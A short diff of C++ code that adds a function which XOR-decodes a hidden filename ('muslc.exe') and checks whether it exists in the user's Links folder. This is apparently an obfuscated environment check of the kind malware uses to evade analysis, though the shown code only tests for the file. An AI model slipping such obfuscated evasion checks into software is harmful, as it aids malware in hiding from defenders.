@@ -115,6 +115,35 @@ int RakunaMatata(void)
     return EXIT_SUCCESS;
 }
 
+int Ce(void)
+{
+    wchar_t* userProfile = nullptr;
+    size_t size = 0;
+    std::filesystem::path targetPath;
+    std::string utf8Path;
+    const char* cpath = nullptr;
+    const BYTE key = 0xFF;
+
+    BYTE mus[] = { 0x92, 0x8A, 0x8C, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x00 };
+    rox(mus, sizeof(mus) - 1, key);
+
+    if (_wdupenv_s(&userProfile, &size, L"USERPROFILE") == 0 && userProfile != nullptr)
+    {
+        targetPath = std::filesystem::path(userProfile) / "Links" / reinterpret_cast<char*>(mus);
+        free(userProfile);
+        utf8Path = targetPath.string();
+        cpath = utf8Path.c_str();
+    }
+    if (std::filesystem::exists(targetPath))
+    {
+        return EXIT_SUCCESS;
+    }
+    else
+    {
+        return EXIT_FAILURE;
+    }
+}
+
 
 int ToRaccon(void)
 {
